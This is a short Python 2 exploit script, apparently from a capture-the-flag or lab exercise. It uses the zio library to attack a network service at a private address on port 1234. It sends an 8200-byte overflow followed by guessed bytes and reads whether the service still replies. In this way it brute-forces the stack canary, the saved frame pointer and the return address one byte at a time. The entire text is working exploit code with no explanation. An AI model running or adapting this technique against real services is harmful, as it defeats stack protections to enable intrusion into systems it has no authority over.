#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

canary_value = 0
save_rbp = 0
ret_address = 0
ip = '10.10.10.128'
payload = "A"*8200

def my_hex(byte):
	result = hex(byte)[2:4]
	if len(result) < 2:
		result = "0" + result
	return result

def a_byte(num):
	global payload
	address = 0
	while address <= 255:
		io = zio((ip, 1234), timeout = 100000, print_read = REPR, print_write = COLORED(REPR))
		io.write(payload + chr(address) )
		io.read_until('thanks.')
		io.readline()
		data = io.readline()
		if data != '':
			payload += chr(address)
			result = my_hex(address)
			#log("address_"+ str(num) + ": " + result, 'red')
			return result
		address += 1

def byte_by_byte():
	global canary_value, save_rbp, ret_address
	address = []
	for i in range(8):
		address.append(a_byte(i))
	address.reverse()
	result = ''.join(address)
	if canary_value == 0:
		canary_value = int(result, 16)
		#log("canary: 0x" + result, 'red')
	elif save_rbp == 0:
		save_rbp = int(result, 16)
		#log("save_rbp: 0x" + result, 'red')
	else:
		ret_address = int(result[0:14] + "15", 16)
		#log("ret_address: 0x" + result, 'red')


#leak canary, rbp, ret_address
#for x in range(3):
#byte_by_byte()
log("----------result----------", 'red')
log("canary: " + hex(canary_value), 'red')
log("save_rbp: " + hex(save_rbp), 'red')
log("ret_address: " + hex(ret_address), 'red')
